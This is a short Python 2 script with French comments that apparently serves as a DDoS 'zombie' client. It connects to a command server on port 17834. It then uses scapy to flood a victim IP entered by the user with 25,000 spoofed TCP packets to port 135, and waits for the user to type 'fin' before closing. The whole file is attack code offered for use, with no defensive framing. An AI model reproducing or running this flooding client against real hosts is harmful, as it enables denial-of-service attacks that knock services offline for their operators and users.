# coding: utf8
################################################################
#@client Ddos                                                  #
#@auteur: Ludovic Chopin							       	   #
#@commentaire: permet de se connecter a un MCC pour envoyer,   #
#des requetes Ddos, ce client sert de Zombie, 				   #
#pour une IP Victime désigné par avance	lors d'une attaque.	   #		
################################################################

import socket
import logging
#suppression des erreurs de faible gravité avant l'importation de scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
from scapy.all import *


PORT = 17834 #port de connection au serveur MCC
HOTE = raw_input("SERVER_IP:")#ip du serveur
VICTIM = raw_input("VICTIM_IP:")#IP de la victime a Ddos

#connection a la socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOTE,PORT))

print ('connection reussie')
print ('........\demarrage attack DDoS/........')
print ('-')*40

#valeur count a modifier pour le nombre de requete
send(IP(src=HOTE, dst=VICTIM)/TCP(sport=135,dport=135), count=25000)  

#boucle permettant la fermeture du script
while True :
	print ('-') *40
    	keyword = raw_input ("taper fin pour terminer:")
    	if "fin" in keyword : break 
	else: 
		print ("vous n'avez pas taper >fin<")
#fermeture de la socket 
s.close()
